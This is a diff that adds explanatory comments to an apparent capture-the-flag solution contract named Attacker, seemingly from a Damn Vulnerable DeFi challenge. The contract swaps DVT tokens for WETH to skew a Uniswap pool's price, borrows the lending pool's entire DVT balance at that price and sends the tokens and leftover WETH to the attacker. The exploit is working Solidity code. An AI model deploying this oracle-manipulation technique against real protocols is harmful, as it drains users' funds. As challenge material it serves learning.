@@ -40,14 +40,17 @@ contract Attacker {
         require(msg.sender == attacker, "Access_Denied");
         uint256 amount = token.balanceOf(attacker);
 
+        //transfer attacker token to this Attacker contract
         token.transferFrom(attacker, address(this), amount);
 
+        //approves DVT amount to the router inorder to swap the amount
         token.approve(address(router), amount);
 
         ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(
             address(token), address(weth), 3000, address(this), block.timestamp + 3, amount, 0, 0
         );
 
+        //swaps all the DVT tokens for WETH in the pool
         router.exactInputSingle(params);
     }
 
@@ -56,12 +59,18 @@ contract Attacker {
 
         uint256 poolBalance = token.balanceOf(address(pool));
 
+        //amount of weth required to borrow all the DVT tokens in lending pool
         uint256 wethAmount = pool.calculateDepositOfWETHRequired(poolBalance);
+
+        //approves weth to the lending pool
         weth.approve(address(pool), wethAmount);
 
+        //calls the borrow function on lending pool with the said amount
         pool.borrow(poolBalance);
 
         uint256 tokenAmount = token.balanceOf(address(this));
+        // if eveything goes right the attacker address will be transferred all the
+        // lending pool tokens and the lending pool will be empty
         token.transfer(attacker, tokenAmount);
     }
 
@@ -71,6 +80,7 @@ contract Attacker {
         uint256 wethAmount = weth.balanceOf(address(this));
         weth.withdraw(wethAmount);
 
+        //send the remaining WETH to the attacker address
         attacker.transfer(address(this).balance);
     }
 }
